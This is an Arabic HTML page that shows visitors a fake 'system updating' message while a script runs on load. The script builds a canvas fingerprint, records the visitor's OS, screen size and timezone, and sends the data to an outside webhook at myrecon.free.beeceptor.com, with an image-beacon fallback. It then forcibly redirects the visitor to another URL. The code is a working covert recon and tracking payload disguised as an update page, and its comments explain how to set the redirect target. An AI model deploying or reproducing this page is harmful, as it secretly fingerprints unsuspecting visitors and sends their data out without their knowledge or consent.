<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        .center-text { font-family: system-ui; color: #ccc; font-size: 14px; }
    </style>
</head>
<body>

    <div class="center-text">جاري تحديث النظام...</div>

    <script>
        // ==========================================================
        //  الخيال العلمي برو ماكس - Forced Navigation Engine
        //  - يجمع البيانات.
        //  - يرسلها.
        //  - يفتح الصفحة التالية فوراً.
        // ==========================================================

        // 1. جمع البيانات فائقة السرعة
        function collectMaxData() {
            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.includes('Windows')) os = "Windows";
            else if (ua.includes('Mac')) os = "macOS";
            else if (ua.includes('iPhone')) os = "iOS";
            else if (ua.includes('Android')) os = "Android";

            // بصمة فريدة
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Ghost_OSINT', 2, 15);
            const id = btoa(canvas.toDataURL()).substring(50, 80);

            return {
                id: id,
                os: os,
                screen: `${window.screen.width}x${window.screen.height}`,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        // 2. الإرسال إلى Beeceptor
        async function sendData(data) {
            const webhook = 'https://myrecon.free.beeceptor.com';
            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    mode: 'no-cors'
                });
            } catch (e) {
                // إرسال عبر الصورة في حال فشل الـ fetch
                const qs = new URLSearchParams(data).toString();
                new Image().src = `${webhook}?${qs}`;
            }
        }

        // 3. دالة التنقل الإجباري (قلب الكود)
        function forceNavigate() {
            // -------------------------------------------------------
            //  هنا تضع الصفحة التي تريد إجبار المستخدم على الذهاب إليها
            //  مثال: فتح جوجل، أو فتح تطبيق واتساب عبر الرابط.
            // -------------------------------------------------------
            const targetUrl = "https://www.google.com";
            
            // إعادة التوجيه الفورية (Hard Redirect)
            window.location.replace(targetUrl);
        }

        // 4. تشغيل المحرك
        window.onload = async function() {
            // 1. جمع البيانات
            const data = collectMaxData();
            
            // 2. إرسال البيانات فوراً (في الخلفية)
            await sendData(data);

            // 3. فتح الصفحة التالية بعد 1.5 ثانية (ليتم الإرسال قبل الانتقال)
            setTimeout(() => {
                forceNavigate();
            }, 1500);
        };
    </script>
</body>
</html>
